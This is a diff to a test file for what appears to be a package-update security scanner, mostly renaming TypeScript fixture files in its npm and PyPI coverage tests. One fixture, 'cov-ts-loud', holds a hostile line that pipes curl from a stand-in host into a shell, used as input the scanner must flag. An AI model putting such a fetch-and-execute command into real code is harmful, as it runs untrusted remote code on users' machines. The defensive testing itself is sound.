@@ -68,11 +68,11 @@ const js = (body) => `module.exports = function () { ${body} };\n`;
 const py = (body) => `def f():\n    ${body}\n`;
 const NPM_PKGS = {
     'cov-full': { '1.0.0': { 'index.js': js('return 1;') }, '1.0.1': { 'index.js': js('return 2;') } },
-    'cov-ts': { '1.0.0': { 'index.js': js('return 1;'), 'src/util.ts': 'export const a: number = 1;\n' }, '1.0.1': { 'index.js': js('return 2;'), 'src/util.ts': 'export const a: number = 2;\n' } },
+    'cov-ts': { '1.0.0': { 'index.js': js('return 1;'), 'src/view.tsx': 'export const a = <b>{1}</b>;\n' }, '1.0.1': { 'index.js': js('return 2;'), 'src/view.tsx': 'export const a = <b>{2}</b>;\n' } },
     'cov-broken': { '1.0.0': { 'index.js': js('return 1;') }, '1.0.1': { 'index.js': js('return 2;'), 'lib/odd.js': 'function ( {\n' } },
     'cov-ts-loud': {
-        '1.0.0': { 'index.js': js('return 1;'), 'src/util.ts': 'export const a: number = 1;\n' },
-        '1.0.1': { 'index.js': js("require('child_process').exec('curl https://x.example | sh');"), 'src/util.ts': 'export const a: number = 2;\n' },
+        '1.0.0': { 'index.js': js('return 1;'), 'src/view.tsx': 'export const a = <b>{1}</b>;\n' },
+        '1.0.1': { 'index.js': js("require('child_process').exec('curl https://x.example | sh');"), 'src/view.tsx': 'export const a = <b>{2}</b>;\n' },
     },
 };
 const PYPI_PKGS = {
@@ -115,7 +115,7 @@ test('package mode: fully parsed npm and PyPI controls are clean and complete', 
 });
 
 for (const [label, spec, name, file, reason] of [
-    ['pattern-only TypeScript', 'npm:cov-ts@1.0.0..1.0.1', 'cov-ts', 'src/util.ts', /TypeScript source; pattern scan only/],
+    ['pattern-only TypeScript', 'npm:cov-ts@1.0.0..1.0.1', 'cov-ts', 'src/view.tsx', /TypeScript source; pattern scan only/],
     ['unparseable JavaScript', 'npm:cov-broken@1.0.0..1.0.1', 'cov-broken', 'lib/odd.js', /not parsed/],
     ['unread encrypted file', 'pypi:covpyenc==1.0.0..1.0.1', 'covpyenc', 'covpyenc/_hidden.py', /encrypted/],
     ['failed artifact', 'pypi:covpyart==1.0.0..1.0.1', 'covpyart', 'sdist', /sha256 mismatch/],
@@ -147,7 +147,7 @@ test('package mode: a review finding still wins over a coverage gap', async () =
     assert.equal(item(io, 'cov-ts-loud').verdict, 'review');
     assert.equal(io.kv.OUTPUT.verdict, 'review');
     assert.equal(io.kv.OUTPUT.complete, false);
-    assert.match(io.kv.REPORT, /src\/util\.ts/);
+    assert.match(io.kv.REPORT, /src\/view\.tsx/);
 });
 
 const npmLock = (pkgs) => JSON.stringify({ lockfileVersion: 3, packages: { '': { name: 'app' }, ...Object.fromEntries(Object.entries(pkgs).map(([n, v]) => [`node_modules/${n}`, { version: v, resolved: `${NPM}/${n}/-/${n}-${v}.tgz` }])) } });
@@ -174,7 +174,7 @@ test('lockfile mode (npm): fully parsed control is clean; partial packages are i
     assert.match(compact, /cov-full/);
     assert.doesNotMatch(compact, /cov-ts|cov-broken/);
     assert.match(md, /⚪ PARTLY ANALYSED — `cov-ts` `1\.0\.0` → `1\.0\.1`/);
-    assert.match(md, /src\/util\.ts: TypeScript source; pattern scan only/);
+    assert.match(md, /src\/view\.tsx: TypeScript source; pattern scan only/);
     assert.match(md, /⚪ PARTLY ANALYSED — `cov-broken` `1\.0\.0` → `1\.0\.1`/);
     assert.match(md, /lib\/odd\.js: not parsed/);
 });
